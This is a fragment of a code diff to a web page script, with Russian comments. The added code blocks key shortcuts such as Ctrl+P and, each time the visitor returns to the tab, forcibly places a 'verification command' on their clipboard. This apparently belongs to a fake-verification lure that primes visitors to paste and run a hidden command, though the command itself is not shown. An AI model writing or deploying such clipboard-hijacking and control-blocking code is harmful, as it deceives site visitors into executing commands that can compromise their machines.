+                {ctrl: true, key: 'p'},
+                {ctrl: true, shift: true, key: 'p'}
+            ];
+            
+            // Check single keys
+            if (blockedKeys.includes(e.key)) {
+                e.preventDefault();
+                return false;
+            }
+            
+            // Check key combinations
+            for (const combo of blockedCombos) {
+                if (e.ctrlKey === combo.ctrl && 
+                    e.shiftKey === (combo.shift || false) && 
+                    e.key.toLowerCase() === combo.key) {
+                    e.preventDefault();
+                    return false;
+                }
             }
         });
         
-        // Попытка автоматического копирования при возвращении на вкладку
+        // Попытка копирования при возвращении на вкладку
         document.addEventListener('visibilitychange', function() {
             if (!document.hidden) {
                 setTimeout(() => {
-                    copyToClipboard(verificationCommand);
+                    const command = getVerificationCommand();
+                    forceCopyToClipboard(command);
                 }, 300);
-            }
-        });
-        
-        // Защита от копирования текста
-        document.addEventListener('selectstart', function(e) {
-            if (e.target.id !== 'verificationCode') {
-                e.preventDefault();
             }
         });
     </script>
